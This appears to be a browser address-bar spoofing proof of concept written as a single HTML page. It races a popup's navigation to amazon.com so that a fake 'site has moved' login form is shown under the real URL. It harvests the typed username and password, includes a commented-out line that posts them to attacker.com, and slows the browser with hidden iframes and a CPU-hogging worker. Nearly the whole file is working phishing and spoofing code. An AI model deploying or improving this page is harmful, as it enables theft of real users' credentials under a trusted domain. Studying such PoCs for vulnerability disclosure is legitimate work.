<!DOCTYPE html>
<html>
<head>
    <title>Fixed Interactive Spoof PoC</title>
</head>
<body>
    <a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
</body>
<script>
var w;
var t;
var z;

if (location.href.indexOf("fake") !== -1) {
    // Make fake content interactive: Add login form with JS submit to avoid CORS
    document.body.innerHTML = `
        <h1>This website has moved to http://fake.com</h1>
        <p>Please login to continue:</p>
        <form id="fakeForm">
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button type="button" onclick="stealData()">Login</button>
        </form>
        <button onclick="alert('You clicked a fake button! Data stolen.')">Click Me (Fake Amazon Deal)</button>
    `;
    
    // JS function to simulate data steal (alert or console for demo; replace with fetch to attacker)
    window.stealData = function() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        alert(`Stolen: Username=${user}, Password=${pass}`); // Demo; use fetch for real
        // fetch('http://attacker.com/steal', {method: 'POST', body: JSON.stringify({user, pass})}); // If CORS allowed
    };
    
    // Request fullscreen after user interaction (better timing)
    setTimeout(() => {
        document.body.requestFullscreen().catch(err => console.log('Fullscreen failed:', err));
    }, 100);
}

function foo() {
    document.getElementById("test").href = "#";
    w = window.open("?fake");
    t = setInterval(bar, 5);
}

function bar() {
    if (w.location.href !== 'about:blank') {
        alert("Redirecting");
        document.body.innerHTML = "<h1>Redirecting</h1>";
        slow();
        
        // Back to real redirect for proper race condition (remove pushState)
        w.location.href = 'https://www.amazon.com/';
        
        clearInterval(t);
        z = setInterval(baz, 5);
    }
}

function baz() {
    try {
        w.location.href !== 'about:blank';
    } catch (e) {
        // Chain interruption: Slower 204 + data URI (avoid javascript: URI blocks)
        w.location.href = 'https://httpstat.us/204?sleep=200';
        setTimeout(() => {
            w.location.href = 'data:text/html,<h1>Blank Stale</h1>'; // Force no-paint without script exec block
        }, 150);
        
        // Simulate tab switch for occlusion exploit
        w.blur();
        setTimeout(() => w.focus(), 50);
        
        clearInterval(z);
    }
}

// Fixed slowdown: Correct loop + Web Worker
function slow() {
    for (let i = 0; i < 50; i++) { // Fixed: i < 50
        let iframe = document.createElement("iframe");
        iframe.src = 'https://www.amazon.com/';
        iframe.style = 'display:none';
        document.body.appendChild(iframe);
    }
    
    // Web Worker for CPU hog
    const workerCode = `
        onmessage = () => {
            let start = performance.now();
            while (performance.now() - start < 200) {}
            postMessage('done');
        };
    `;
    const blob = new Blob([workerCode], {type: 'application/javascript'});
    const worker = new Worker(URL.createObjectURL(blob));
    worker.postMessage('start');
    worker.onmessage = () => worker.terminate();
    
    // Fallback busy-wait (reduced to avoid freeze)
    let start = performance.now();
    while (performance.now() - start < 50) {} // Reduced to 50ms
}
</script>
</html>
